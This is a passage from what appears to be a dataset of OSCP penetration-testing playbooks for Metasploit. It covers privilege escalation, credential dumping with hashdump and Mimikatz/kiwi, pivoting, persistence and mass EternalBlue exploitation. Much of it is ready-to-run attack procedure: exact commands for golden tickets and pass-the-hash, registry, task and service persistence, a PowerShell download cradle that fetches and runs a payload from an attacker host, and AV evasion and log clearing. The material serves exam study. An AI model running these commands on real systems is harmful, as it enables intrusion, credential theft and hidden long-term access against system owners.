reveals: SeImpersonatePrivilege (Potato attacks: JuicyPotato, RoguePotato, PrintSpoofer), SeDebugPrivilege (dump LSASS memory for credentials), SeLoadDriverPrivilege (load malicious kernel driver for SYSTEM). OSCP workflow: 1) Gain initial Meterpreter session (any user), 2) Enumerate (sysinfo, getuid, getprivs), 3) Migrate to stable process (explorer.exe for user-level, or defer until after privesc), 4) Escalate privileges if low-privilege (getsystem, exploit suggester), 5) Migrate to SYSTEM process after escalation (lsass.exe, svchost.exe), 6) Post-exploitation (hashdump, credential gathering). Common pitfalls: Migrating to SYSTEM process without SYSTEM privileges (fails with 'Access denied'), Choosing unstable PID (migrated process terminates, session lost), Not backgrounding session before running long tasks (blocks other operations). Troubleshooting: migration fails: Try different PID (some processes protected), Check current privileges: getprivs (need SeDebugPrivilege for some migrations), Use migrate -N <process_name> instead of PID: migrate -N explorer.exe (auto-finds PID). Session stability tips: Always migrate immediately after initial access, Use background before running post modules (avoids blocking), Run session -i -c 'migrate -N explorer.exe' -i 1 (automated migration from msfconsole).""}, {""title"": ""Scenario 2: Windows Privilege Escalation with getsystem and Exploit Suggester"", ""context"": ""Meterpreter session as standard user (bob) on Windows 7 SP1 target. Need SYSTEM privileges to access SAM database and domain credentials. Goal: Escalate to SYSTEM using automated Meterpreter techniques."", ""approach"": ""Step 1: Try automated privilege escalation: getsystem (attempts 3 techniques). Step 2: If getsystem fails, check available techniques: getsystem -h (shows technique list). Step 3: Try specific technique: getsystem -t 1 (Named Pipe Impersonation). Step 4: If all getsystem techniques fail, background session: background. Step 5: Run exploit suggester: use post/multi/recon/local_exploit_suggester; set SESSION 1; run. Step 6: Review suggested exploits (MS16-032, MS15-051, etc.). Step 7: Use suggested exploit: use exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION 1; set LHOST 192.168.45.5; run. Step 8: New SYSTEM session opens. Step 9: Verify escalation: getuid (should show NT AUTHORITY\\SYSTEM)."", ""commands"": [""meterpreter-getsystem"", ""meterpreter-getuid"", ""msf-session-background""], ""expected_outcome"": ""getsystem shows: '[*] Trying technique 1 (Named Pipe Impersonation), [+] Success! New UID: NT AUTHORITY\\SYSTEM'. If successful, getuid confirms SYSTEM. If getsystem fails: '[*] Trying technique 1... Failed, [*] Trying technique 2... Failed, [*] Trying technique 3... Failed, [-] Could not escalate privileges'. Exploit suggester output: '[*] Collecting local exploit suggestions, [*] 10.10.10.50 - Vulnerable to: exploit/windows/local/ms16_032_secondary_logon_handle_privesc, [*] 10.10.10.50 - Vulnerable to: exploit/windows/local/ms15_051_client_copy_image'. Running suggested exploit: '[*] Started reverse TCP handler, [*] Launching notepad to host the exploit, [+] Process launched with PID 2340, [*] Meterpreter session 2 opened (SYSTEM privileges)'. Time: 10 seconds for getsystem (instant if successful), 2-5 minutes for exploit suggester + exploitation. Success rate: getsystem works on ~60% of Windows 7/Server 2008 targets with vulnerable configurations, Exploit suggester finds additional paths when getsystem fails. Common scenarios: getsystem succeeds: User has SeImpersonatePrivilege or SeDebugPrivilege (common on IIS, SQL Server accounts), getsystem fails but suggester finds kernel exploit: Unpatched Windows 7/8/Server 2008 (MS16-032, MS15-051, MS14-058)."", ""why_this_works"": ""getsystem techniques (3 built-in methods): Technique 1 (Named Pipe Impersonation): Creates named pipe with SYSTEM token, Tricks SYSTEM service (RPCSS) to connect, Impersonates SYSTEM token via ImpersonateNamedPipeClient API, Requires SeImpersonatePrivilege (common on service accounts). Technique 2 (Token Duplication): Finds SYSTEM process token, Duplicates token using DuplicateTokenEx API, Creates new process with SYSTEM token, Requires SeDebugPrivilege. Technique 3 (Named Pipe Impersonation - Variant): Alternative named pipe technique with different service targeting, Fallback if Technique 1 fails. Why getsystem may fail: Missing required privileges (neither SeImpersonate nor SeDebug), Windows 10 with recent patches (mitigations for token impersonation), Restricted process permissions (can't access SYSTEM process tokens). Exploit suggester workflow: Gathers system info: OS version (Windows 7 SP1 = many kernel exploits), Architecture (x86 vs x64), Installed hotfixes (checks for missing patches: wmic qfe list). Queries Metasploit database: Compares OS/hotfix data against known local exploits, Returns list of potentially successful exploit modules, Ranks by likelihood (reliability rank, patch status). Local privilege escalation exploits: MS16-032: Secondary Logon Handle Privilege Escalation (CVE-2016-0099), Affects: Windows 7/8/Server 2008/2012, Exploits: Insecure handle in Secondary Logon Service. MS15-051: Windows Client Copy Image Privilege Escalation (CVE-2015-1701), Affects: Windows Vista/7/8/Server 2003/2008, Exploits: Win32k.sys driver vulnerability. MS14-058: TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113), Affects: All Windows versions (pre-patch), Exploits: NULL pointer dereference in Win32k.sys. Automated workflow vs manual exploitation: getsystem: Instant (10 seconds), No system reboot, Works on misconfigured systems (common in labs). Exploit suggester + local exploit: 2-5 minutes, May require stable session (some exploits crash system), Works on unpatched systems (kernel vulnerabilities). OSCP strategy: 1) Try getsystem first (fast, non-intrusive), 2) If fails, run exploit suggester (identify vulnerabilities), 3) Use suggested local exploit (MS16-032 most reliable for Windows 7), 4) Fallback: Manual enumeration (check for scheduled tasks, services, DLL hijacking). Privilege verification: getuid shows current user (NT AUTHORITY\\SYSTEM = success), getprivs shows all privileges: SeDebugPrivilege (dump LSASS), SeTcbPrivilege (act as OS), SeTakeOwnershipPrivilege (take file ownership). Post-escalation tasks: Dump credentials: hashdump (SAM database), load kiwi; creds_all (Mimikatz integration). Persistence: run persistence -X (registry run key), run metsvc (Meterpreter service). Lateral movement: Use dumped credentials with psexec, Pass-the-hash attacks. Troubleshooting: getsystem hangs: Incompatible with current process (migrate to different process first), Exploit suggester shows no results: System fully patched (try manual privesc: unquoted service paths, weak permissions), Exploit crashes system: Use more reliable exploit or manual techniques.""}, {""title"": ""Scenario 3: Credential Harvesting with Mimikatz and Kiwi"", ""context"": ""Escalated to SYSTEM on Windows 10 domain-joined target (CORP\\DC-01). Need credentials for lateral movement to other domain systems. Goal: Extract plaintext passwords, NTLM hashes, and Kerberos tickets."", ""approach"": ""Step 1: Dump SAM database (local accounts): hashdump (extracts NTLM hashes from SAM). Step 2: Load Mimikatz extension: load kiwi (Meterpreter's Mimikatz integration). Step 3: Dump all credentials from memory: creds_all (plaintext passwords, hashes, tickets). Step 4: Alternative - specific credential types: creds_msv (NTLM), creds_kerberos (Kerberos tickets), creds_wdigest (plaintext if enabled). Step 5: Dump domain cached credentials: lsa_dump_sam, lsa_dump_secrets. Step 6: Golden ticket attack (if domain admin): golden_ticket_create -u administrator -d corp.local -k <KRBTGT_hash> -s <SID>. Step 7: Save credentials to file: creds_all > /root/creds.txt (from Meterpreter). Step 8: Use credentials for lateral movement: use exploit/windows/smb/psexec; set SMBUser administrator; set SMBPass <hash>; set RHOSTS <target>; run."", ""commands"": [""meterpreter-hashdump"", ""meterpreter-load-kiwi"", ""meterpreter-kiwi-creds-all""], ""expected_outcome"": ""hashdump shows: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::, Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::, bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::' (format: username:RID:LM hash:NTLM hash). load kiwi shows: '[*] Loading extension kiwi, [*] Success'. creds_all shows: 'msv credentials (NTLM hashes): bob / CORP / 64f12cddaa88057e06a81b54e73b949b, wdigest credentials (plaintext): Administrator / CORP / P@ssw0rd123!, kerberos credentials (TGT tickets): Administrator@CORP.LOCAL / krbtgt/CORP.LOCAL'. If plaintext passwords shown: WDigest enabled on older Windows (7/Server 2008) or manually enabled. If no plaintext: Windows 10/Server 2016+ (WDigest disabled by default). Time: 30 seconds for hashdump, 1-2 minutes for kiwi credential extraction. Credential types extracted: NTLM hashes (pass-the-hash attacks), Plaintext passwords (direct login), Kerberos TGT (pass-the-ticket, golden ticket attacks). Common use cases: Pass-the-hash: psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.45.101, Pass-the-ticket: kerberos::ptt <ticket.kirbi> (inject TGT for impersonation), Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt (offline cracking)."", ""why_this_works"": ""Windows credential storage locations: SAM database (Security Account Manager): Stores local account NTLM hashes (Administrator, Guest, local users), Located: C:\\Windows\\System32\\config\\SAM, Encrypted with SYSKEY (requires SYSTEM to decrypt), hashdump decrypts SAM and dumps hashes. LSASS process (Local Security Authority Subsystem Service): Stores credentials in memory for SSO (Single Sign-On), Contains: Plaintext passwords (if WDigest enabled), NTLM hashes (MSV authentication), Kerberos tickets (TGT, TGS for domain authentication), kiwi/Mimikatz dumps LSASS memory. LSA Secrets (Local Security Authority Secrets): Stores service account passwords, VPN credentials, auto-logon passwords, Domain computer account passwords, Cached domain credentials (last 10 domain logins). Hashdump internals: Reads SAM and SYSTEM registry hives, Decrypts SAM with SYSKEY from SYSTEM hive, Extracts NTLM hashes (format: username:RID:LM:NTLM:::), LM hashes usually 'aad3b435b51404eeaad3b435b51404ee' (disabled in modern Windows). Mimikatz/Kiwi functionality: Dumps LSASS process memory (requires SeDebugPrivilege = SYSTEM), Parses credential structures: MSV (NTLM hashes), WDigest (plaintext passwords, if enabled), Kerberos (TGT/TGS tickets), CredMan (saved credentials from Credential Manager). WDigest and plaintext passwords: Windows 7/Server 2008: WDigest enabled by default (stores plaintext in memory), Windows 8.1+/Server 2012+: WDigest disabled (no plaintext unless manually enabled), Force enable: reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 (requires reboot). Kerberos credential extraction: TGT (Ticket Granting Ticket): Valid for 10 hours (default), Used to request TGS (service tickets), Can be extracted and reused (pass-the-ticket attack). TGS (Ticket Granting Service): Service-specific ticket (SMB, HTTP, LDAP), Used for authentication to specific service, Extract with kiwi for targeted attacks. Golden Ticket: Forged TGT using KRBTGT account hash, Grants persistent domain admin access (valid until password change), Requires: Domain SID, KRBTGT NTLM hash, Target username. OSCP workflow: 1) Gain SYSTEM on domain member, 2) hashdump for local accounts, 3) load kiwi; creds_all for domain credentials, 4) Save credentials to file for documentation, 5) Use credentials for lateral movement: psexec, winexe, crackmapexec, 6) Target domain controller next (replicate hashdump on DC for all domain hashes). Credential types and usage: NTLM hashes: Pass-the-hash attacks (no need to crack), SMB lateral movement: psexec.py -hashes :hash admin@target, RDP with Restricted Admin mode (if enabled). Plaintext passwords: Direct RDP/WinRM/SSH login, Spray across domain for additional access, Crack other hashes (password reuse). Kerberos tickets: Pass-the-ticket (inject TGT, impersonate user), Kerberoasting (extract service account TGS, crack offline), Golden ticket (persistent domain admin). Troubleshooting: hashdump fails 'Operation failed: Access denied': Not running as SYSTEM (run getsystem first), SAM file locked (reboot or use Volume Shadow Copy: vssadmin create shadow /for=C:). kiwi creds_all shows no passwords: WDigest disabled (Windows 10+), No interactive logons recently (credentials not cached in LSASS), Try alternative: lsa_dump_secrets (service account passwords). Mimikatz detected by AV: Use built-in hashdump (bypasses some AV), Disable AV temporarily: run killav (aggressive, noisy), Use alternative: procdump + offline Mimikatz (dump LSASS to file, analyze offline). OPSEC considerations: LSASS memory dump triggers EDR alerts (very suspicious), hashdump less noisy (reads registry, doesn't touch LSASS), kiwi/Mimikatz requires disable AV in many environments, Alternative stealth: Use native tools (reg save HKLM\\SAM sam.save; download sam.save; crack offline).""}, {""title"": ""Scenario 4: Pivoting and Network Routing"", ""context"": ""Compromised web server (192.168.45.100) has two network interfaces: External (192.168.45.100/24), Internal (10.10.10.50/24). Internal network hosts domain controller (10.10.10.10) and file server (10.10.10.20). Goal: Route traffic through compromised host to access internal network."", ""approach"": ""Step 1: Check network interfaces: ipconfig (Windows) or ifconfig (Linux). Step 2: Identify new subnet: 10.10.10.0/24 on eth1/Internal Adapter. Step 3: Add route to internal network: run autoroute -s 10.10.10.0/24 (Meterpreter auto-routing). Step 4: Verify route: run autoroute -p (print routing table). Step 5: Background session: background. Step 6: Use Metasploit modules against internal network: use auxiliary/scanner/portscan/tcp; set RHOSTS 10.10.10.0/24; set PORTS 445,3389,22; run (scan through pivot). Step 7: Exploit internal targets: use exploit/windows/smb/psexec; set RHOSTS 10.10.10.10; set SMBUser administrator; set SMBPass <hash>; run (session on internal DC). Step 8: Alternative - SOCKS proxy for external tools: use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 4a; run (start SOCKS server). Step 9: Configure proxychains: Edit /etc/proxychains4.conf, add 'socks4 127.0.0.1 1080'. Step 10: Use external tools through pivot: proxychains nmap -sT -Pn 10.10.10.10 (nmap via SOCKS)."", ""commands"": [""meterpreter-ipconfig"", ""meterpreter-route-add"", ""msf-session-background""], ""expected_outcome"": ""ipconfig shows: 'Ethernet adapter Local Area Connection: IPv4 Address: 192.168.45.100, Subnet Mask: 255.255.255.0, Ethernet adapter Internal: IPv4 Address: 10.10.10.50, Subnet Mask: 255.255.255.0'. autoroute -s 10.10.10.0/24 shows: '[*] Adding route to 10.10.10.0/255.255.255.0 via session 1, [+] Route added'. autoroute -p shows: 'Active Routing Table: Subnet, Netmask, Gateway, 10.10.10.0, 255.255.255.0, Session 1'. Metasploit modules now route through pivot: tcp portscan shows 'Open ports: 10.10.10.10:445, 10.10.10.10:3389, 10.10.10.20:445'. psexec exploitation: '[*] Connecting to 10.10.10.10:445, [*] Meterpreter session 2 opened (to internal DC)'. SOCKS proxy: '[*] SOCKS proxy started on 127.0.0.1:1080'. proxychains nmap shows: 'ProxyChains-3.1 (http://proxychains.sf.net), [proxychains] Strict chain ... 127.0.0.1:1080 ... 10.10.10.10:445 <--socket connection, Nmap scan results for 10.10.10.10'. Time: 1-2 minutes to set up routing, instant access to internal network. Use cases: Metasploit modules (auxiliary, exploits) route automatically, External tools (nmap, enum4linux, smbclient) require SOCKS proxy. Common issues: Route not working: Check session still active (sessions -l), Verify subnet correct (autoroute -p), SOCKS proxy not proxying: Verify /etc/proxychains4.conf has correct port (1080), Use 'strict_chain' mode (fails if any proxy down)."", ""why_this_works"": ""Network pivoting necessity: Dual-homed hosts (multiple network interfaces) act as bridges, External attacker can't directly reach internal network (10.10.10.0/24), Compromised host has access to both networks, Pivot routes attacker traffic through compromised host. Meterpreter autoroute mechanics: Adds route entry to Metasploit routing table (not host routing table), Format: Subnet + Netmask + Session ID, Example: 10.10.10.0/24 via Session 1, All Metasploit traffic to 10.10.10.0/24 routed through Session 1. Traffic flow: 1) Metasploit module targets 10.10.10.10:445, 2) Metasploit checks routing table, finds 10.10.10.0/24 via Session 1, 3) Sends traffic to Meterpreter session on 192.168.45.100, 4) Meterpreter on compromised host forwards to 10.10.10.10:445, 5) Response returns via same path (reverse routing). SOCKS proxy integration: Metasploit SOCKS server listens on localhost:1080, External tools (nmap, curl, smbclient) configured to use SOCKS proxy, Proxy forwards tool traffic through Meterpreter session, Enables non-Metasploit tools to access internal network. proxychains configuration: /etc/proxychains4.conf contains proxy settings, strict_chain: All proxies must work (fails if one down), dynamic_chain: Skips dead proxies (more resilient), socks4/socks5: Protocol version (socks4a supports DNS through proxy). Use cases for each method: autoroute (Metasploit modules only): Fast (no external proxy needed), Limited to Metasploit modules (auxiliary, exploits, post), Automatic routing (no tool configuration). SOCKS proxy (external tools): Works with any SOCKS-aware tool (nmap, smbclient, browsers), Requires proxychains or manual SOCKS config, Slower (extra proxy hop), More versatile (use favorite tools). Port forwarding alternative: Local port forward: portfwd add -l 4445 -p 445 -r 10.10.10.10 (forward localhost:4445 to internal host 10.10.10.10:445), Access via localhost: smbclient //127.0.0.1:4445/C$ -U administrator (connects to internal SMB), Per-port setup (must forward each service individually). OSCP pivoting workflow: 1) Compromise dual-homed host (web server, VPN endpoint), 2) Enumerate network interfaces (ipconfig, ifconfig), 3) Identify internal networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), 4) Add autoroute for each internal subnet, 5) Scan internal network via Metasploit: db_nmap -sT -Pn 10.10.10.0/24 (through pivot), 6) Exploit internal targets (psexec, EternalBlue, etc.), 7) Repeat pivoting on new internal hosts (multi-hop pivoting). Multi-hop pivoting: Session 1 on external host (192.168.45.100) \u2192 adds route to 10.10.10.0/24, Session 2 on internal host (10.10.10.50) \u2192 adds route to 172.16.0.0/24, Traffic flows: Attacker \u2192 Session 1 \u2192 Session 2 \u2192 172.16.0.5 (three-hop pivot). Advanced pivoting techniques: SSH tunneling (if SSH available): ssh -D 1080 user@192.168.45.100 (dynamic SOCKS), ssh -L 4445:10.10.10.10:445 user@192.168.45.100 (local port forward), Chisel (if no Meterpreter): Upload chisel binary, Run server/client mode for SOCKS proxy. Troubleshooting: autoroute traffic not routing: Firewall on pivot host blocking forwarding (disable: netsh advfirewall set allprofiles state off), Session died (routes invalidated, re-add after new session), SOCKS proxy timeouts: Increase timeout in proxychains.conf: tcp_read_time_out 15000, Use faster tools (Metasploit modules instead of nmap), nmap through SOCKS very slow: Use -T4 for faster scanning, Limit ports: -p 445,3389,22 (avoid full port scan), Use Metasploit's tcp portscan instead (much faster through pivot). OPSEC considerations: Traffic through pivot is encrypted (Meterpreter uses TLS), Internal firewall may still block scans (use stealthy techniques), Network monitoring may detect unusual internal traffic from pivot host (blend in with normal traffic patterns).""}, {""title"": ""Scenario 5: Persistence Mechanisms for Long-Term Access"", ""context"": ""Gained SYSTEM on Windows domain controller. OSCP exam scenario requires 48-hour access. Need persistence in case of reboot, session loss, or AV detection. Goal: Install multiple persistence mechanisms for redundancy."", ""approach"": ""Step 1: Registry Run Key persistence: run persistence -X -i 60 -p 443 -r 192.168.45.5 (creates registry entry + payload). Step 2: Scheduled task persistence: run schtasks -X -i 120 -p 4444 -r 192.168.45.5 (runs every 120 seconds). Step 3: Service-based persistence: upload /root/payload.exe C:\\Windows\\Temp\\svc.exe; shell; sc create PersistentSvc binPath= C:\\Windows\\Temp\\svc.exe start= auto; sc start PersistentSvc. Step 4: Set up listener for callbacks: use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; exploit -j -z. Step 5: Test persistence (optional): reboot target, wait for callbacks, sessions -l (should see new session after reboot). Step 6: Cleanup before exam end: run persistence -U (removes registry persistence), sc stop PersistentSvc; sc delete PersistentSvc (removes service)."", ""commands"": [""meterpreter-upload"", ""meterpreter-shell"", ""msf-handler-background""], ""expected_outcome"": ""persistence -X shows: '[*] Creating persistent agent: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, [*] Persistent agent script written to C:\\Windows\\TEMP\\payload.vbs, [*] Persistence established, callbacks every reboot to 192.168.45.5:443'. schtasks -X shows: '[*] Creating scheduled task to run every 120 seconds, [*] Task created: \\Windows\\System\\Maintenance'. Service creation: 'SC CreateService SUCCESS'. Handler receives callbacks: '[*] Meterpreter session 3 opened' (after reboot or interval). Time: 5-10 minutes to set up multiple persistence methods. Redundancy: If registry persistence detected/removed, scheduled task provides backup, If AV kills payload, service restarts it. Common issues: Persistence payload detected by AV (encode payload: msfvenom -e x86/shikata_ga_nai -i 5), Target reboots and no callback (firewall blocking outbound, verify LHOST/LPORT), Cleanup fails (manual removal: reg delete HKLM\\...\\Run /v payload /f; schtasks /delete /tn ...)."", ""why_this_works"": ""Persistence necessity: Meterpreter sessions are volatile (lost on reboot, network disruption, process termination), OSCP exam: 48-hour duration, need access continuity, Real engagements: Long-term access for data exfiltration, monitoring. Persistence methods overview: Registry Run Keys: Payload executes on user logon or system boot, Location: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (system-wide), HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (user-specific), Execution trigger: User logon (for HKCU), System boot (for HKLM with SYSTEM privileges). Scheduled Tasks: Payload executes at intervals (every 60/120 seconds) or specific times, Location: Task Scheduler (\\Windows\\System\\...), Execution trigger: Time-based (interval or schedule), Stealthier (can use obscure task names). Windows Services: Payload runs as background service, Location: Services (sc query shows registered services), Execution trigger: System boot (if start=auto), Persistent across reboots, runs with SYSTEM privileges. Startup Folder: Payload copied to startup directory, Location: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup, Execution trigger: User logon. Registry Run Key mechanics (persistence -X): Creates VBS dropper script (downloads payload via HTTP), Adds registry entry: HKLM\\...\\Run = 'wscript C:\\Windows\\TEMP\\payload.vbs', On boot/logon: wscript executes VBS, VBS downloads Meterpreter payload from attacker, Payload connects back to handler. Scheduled Task mechanics (schtasks -X): Creates scheduled task with schtasks command, Task triggers every X seconds (configurable with -i option), Executes payload: powershell -nop -w hidden -c \""IEX((new-object net.webclient).downloadstring('http://192.168.45.5/payload'))\"" (PowerShell download cradle), Payload executes in memory (no disk write if using downloadstring). Service-based persistence: Upload payload to target: upload payload.exe C:\\Windows\\Temp\\svc.exe, Create service: sc create PersistentSvc binPath= \""C:\\Windows\\Temp\\svc.exe\"" start= auto, Start service: sc start PersistentSvc, Service runs payload with SYSTEM privileges, Restarts on boot (start=auto). Handler requirements: Must use ExitOnSession false (catch multiple callbacks without handler stopping), Use background job: exploit -j -z (allows continued work while handler listens), Multiple handlers: Set up handlers on different ports for each persistence method (443 for registry, 4444 for schtasks, etc.). OSCP exam strategy: Set up persistence immediately after gaining SYSTEM on critical box (domain controller), Use multiple methods for redundancy (registry + schtasks + service), Test callbacks before relying on persistence (reboot in lab environment), Document persistence locations (needed for cleanup and reporting), Remove all persistence before exam end (part of rules, avoid points deduction). Cleanup commands: Registry: run persistence -U (automated), Manual: reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <name> /f. Scheduled Task: schtasks /delete /tn <task_name> /f. Service: sc stop <service_name>; sc delete <service_name>. Stealth considerations: Avoid obvious names: 'payload.exe' \u2192 'svchost.exe' (blend with legitimate), Use Windows directories: C:\\Windows\\System32 (less suspicious than C:\\Temp), Obfuscate registry values: 'Meterpreter' \u2192 'Windows Update Service'. AV evasion for persistence payloads: Encode payload: msfvenom -e x86/shikata_ga_nai -i 5 -p windows/meterpreter/reverse_tcp, Use PowerShell download cradle (downloads payload from attacker server, executes in memory), Alternative: DLL hijacking (replace legitimate DLL with malicious one, harder to detect). Troubleshooting: Callbacks stop after reboot: Firewall rule blocking outbound (add rule: netsh advfirewall firewall add rule ...), Payload deleted by AV (whitelist path or use encoded payload), Handler not running (start background handler first). Persistence not triggering: Registry Run key requires reboot/logon (wait or force reboot), Scheduled task disabled (check task status: schtasks /query /tn <name>), Service failed to start (check logs: eventvwr, Application logs). Alternative persistence methods (advanced): WMI Event Subscription: Payload triggers on WMI events (user logon, process creation), Stealthy (not in registry or Task Scheduler), Difficult to detect and remove. Logon Scripts: GPO or local logon scripts execute payload, Requires domain admin for GPO, Local scripts in C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. DLL Hijacking: Replace legitimate DLL with malicious one (e.g., DLL in application directory), Application loads malicious DLL on startup, Very stealthy (blends with legitimate processes).""}]","[{""title"": ""Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)"", ""notes"": ""Immediately after gaining Meterpreter session, enumerate system: sysinfo (OS, arch, domain), getuid (current user), getprivs (privileges), ps (running processes). Migrate to stable process: migrate <explorer.exe PID> (prevents session loss). Background session: background (or Ctrl+Z). Estimated time: 2-3 minutes."", ""commands"": [{""id"": ""meterpreter-sysinfo"", ""example"": ""sysinfo"", ""shows"": ""Computer name displayed""}, {""id"": ""meterpreter-getuid"", ""example"": ""getuid"", ""shows"": ""Server username displayed (DOMAIN\\user format on Windows)""}, {""id"": ""meterpreter-getprivs"", ""example"": ""getprivs"", ""shows"": ""Enabled Process Privileges list""}, {""id"": ""meterpreter-ps"", ""example"": ""ps"", ""shows"": ""Process list with columns: PID, PPID, Name, Arch, Session...""}, {""id"": ""meterpreter-migrate"", ""example"": ""migrate 1234"", ""shows"": ""Migrating from <OLD_PID> to <NEW_PID>""}]}, {""title"": ""Phase 2: Privilege Escalation (If Not Already SYSTEM)"", ""notes"": ""Try automated escalation: getsystem (3 techniques). If fails, background session and run exploit suggester: use post/multi/recon/local_exploit_suggester; set SESSION 1; run. Use suggested exploits (MS16-032, MS15-051). Verify escalation: getuid (should show SYSTEM). Estimated time: 1-5 minutes (instant if getsystem works, longer for exploit suggester)."", ""commands"": [{""id"": ""meterpreter-getsystem"", ""example"": ""getsystem"", ""shows"": ""got system via technique N""}, {""id"": ""meterpreter-getuid"", ""example"": ""getuid"", ""shows"": ""Server username displayed (DOMAIN\\user format on Windows)""}]}, {""title"": ""Phase 3: Credential Harvesting (Post-Escalation)"", ""notes"": ""Dump local hashes: hashdump (SAM database). Load Mimikatz: load kiwi. Extract all credentials: creds_all (plaintext, hashes, tickets). Dump LSA secrets: lsa_dump_secrets (service accounts, cached creds). Save to file: creds_all > /root/creds_<target>.txt. Use for lateral movement. Estimated time: 2-5 minutes."", ""commands"": [{""id"": ""meterpreter-hashdump"", ""example"": ""hashdump"", ""shows"": ""Username:RID:LM_hash:NTLM_hash::: format""}, {""id"": ""meterpreter-load-kiwi"", ""example"": ""load kiwi"", ""shows"": ""Mimikatz ASCII art displayed""}, {""id"": ""meterpreter-kiwi-creds-all"", ""example"": ""creds_all"", ""shows"": ""Credentials table with Username, Domain, NTLM, SHA1""}]}, {""title"": ""Phase 4: Pivoting Setup (Multi-Network Environments)"", ""notes"": ""Check network interfaces: ipconfig/ifconfig (identify additional subnets). Add routes: run autoroute -s <subnet>/24 for each internal network. Verify routes: run autoroute -p. Background session. Scan internal network: use auxiliary/scanner/portscan/tcp; set RHOSTS <internal_subnet>; run. For external tools: Set up SOCKS proxy: use auxiliary/server/socks_proxy; set SRVPORT 1080; run. Configure proxychains, use tools via proxychains. Estimated time: 3-5 minutes for routing setup."", ""commands"": [{""id"": ""meterpreter-ipconfig"", ""shows"": ""See command documentation""}, {""id"": ""meterpreter-route-add"", ""example"": ""run autoroute -s 172.16.5.0/24"", ""shows"": ""Route added successfully""}]}, {""title"": ""Phase 5: Persistence Installation (Long-Term Access)"", ""notes"": ""Install multiple persistence methods for redundancy. Registry: run persistence -X -i 60 -p 443 -r <LHOST>. Scheduled task: run schtasks -X -i 120 -p 4444 -r <LHOST>. Service: upload payload, create service with sc create. Set up background handler: use exploit/multi/handler; set ExitOnSession false; exploit -j -z. Test callbacks after reboot (optional). Document persistence locations for cleanup. Estimated time: 5-10 minutes."", ""commands"": [{""id"": ""meterpreter-upload"", ""example"": ""upload /usr/bin/unix-privesc-check C:\\Temp\\privesc.exe"", ""shows"": ""Uploading: <file>""}, {""id"": ""meterpreter-shell"", ""example"": ""shell"", ""shows"": ""Process created""}, {""id"": ""msf-handler-background"", ""example"": ""use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j"", ""shows"": ""Exploit running as background job <ID>""}]}, {""title"": ""Phase 6: Post-Exploitation Documentation and Cleanup"", ""notes"": ""Document all findings: Credentials harvested (creds_all output), Persistence mechanisms installed (registry keys, tasks, services), Network routes established (autoroute -p), Sessions maintained (sessions -l). Cleanup before engagement end: Remove persistence (run persistence -U, sc delete <service>, schtasks /delete /tn <task>), Clear logs (clearev - only in authorized engagements), Kill sessions (sessions -K). Estimated time: 10-15 minutes for thorough cleanup."", ""commands"": [{""id"": ""meterpreter-hashdump"", ""example"": ""hashdump"", ""shows"": ""Username:RID:LM_hash:NTLM_hash::: format""}, {""id"": ""meterpreter-kiwi-creds-all"", ""example"": ""creds_all"", ""shows"": ""Credentials table with Username, Domain, NTLM, SHA1""}, {""id"": ""meterpreter-upload"", ""example"": ""upload /usr/bin/unix-privesc-check C:\\Temp\\privesc.exe"", ""shows"": ""Uploading: <file>""}]}]"
"metasploit-automation","Metasploit Automation - Resource Scripts & Batch Operations","Automated penetration testing workflows using Metasploit resource scripts, AutoRunScript handlers, and mass exploitation techniques for efficient OSCP lab practice and time-sensitive scenarios","METASPLOIT|AUTOMATION|RESOURCE_SCRIPTS|AUTORUNSCRIPT|MASS_EXPLOITATION|EFFICIENCY|OSCP:MEDIUM|TIME_SAVING","{""how_to_recognize"": [""Repetitive tasks across multiple targets (same exploit, same enumeration)"", ""Need to save and replay successful attack chains for documentation"", ""Multiple similar targets requiring identical exploitation steps"", ""Time-sensitive scenarios requiring rapid exploitation (OSCP exam time constraints)"", ""Requirement to automate post-exploitation on every new session (credential dumping, migration)"", ""Lab environment reset requiring re-exploitation of known vulnerabilities""], ""when_to_look_for"": [""After manually exploiting target successfully (capture workflow for future replay)"", ""When OSCP lab resets and you need to quickly re-compromise known vulnerable boxes"", ""Multi-target networks with same vulnerability (mass exploitation)"", ""Repeated testing of exploit reliability (vulnerability research, testing payload variants)"", ""Time pressure scenarios (last hours of exam, need efficiency gains)"", ""Documentation requirements (resource scripts serve as reproducible proof of exploitation)""]}","[{""title"": ""Scenario 1: Resource Script for Automated Exploitation Workflow"", ""context"": ""Successfully exploited 5 Windows targets via MS17-010 (EternalBlue) during OSCP lab session. Lab will reset in 24 hours. Goal: Create resource script to automate re-exploitation after reset without manual intervention."", ""approach"": ""Step 1: Create resource script file: nano /root/eternalblue_multi.rc. Step 2: Add database and workspace setup: 'use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false'. Step 3: Add target loop: 'set RHOSTS 192.168.45.100, exploit -j -z, set RHOSTS 192.168.45.101, exploit -j -z, ...' (repeat for each target). Step 4: Add post-exploitation automation: 'sleep 10, sessions -i 1 -c \""getsystem; hashdump; background\"", sessions -i 2 -c \""getsystem; hashdump; background\""'. Step 5: Save script. Step 6: Execute resource script: msfconsole -r /root/eternalblue_multi.rc. 